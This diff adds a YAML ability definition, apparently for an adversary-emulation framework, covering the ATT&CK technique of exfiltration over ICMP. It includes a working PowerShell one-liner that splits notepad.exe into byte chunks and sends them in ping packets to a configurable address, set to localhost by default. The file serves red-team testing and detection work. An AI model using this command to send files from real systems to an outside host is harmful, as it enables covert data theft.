@@ -1,0 +1,26 @@
+---
+- id: 6baab84fe7a52dd5c4ede612fc0d255f
+  name: Exfiltration Over Alternative Protocol - ICMP
+  description: 'Exfiltration of specified file over ICMP protocol.
+
+
+    Upon successful execution, powershell will utilize ping (icmp) to exfiltrate notepad.exe
+    to a remote address (default 127.0.0.1). Results will be via stdout.
+
+    '
+  tactic: exfiltration
+  technique:
+    attack_id: T1048.003
+    name: 'Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated
+      Non-C2 Protocol'
+  platforms:
+    windows:
+      psh:
+        command: $ping = New-Object System.Net.Networkinformation.ping; foreach($Data
+          in Get-Content -Path C:\Windows\System32\notepad.exe -Encoding Byte -ReadCount
+          1024) { $ping.Send("127.0.0.1", 1500, $Data) }
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
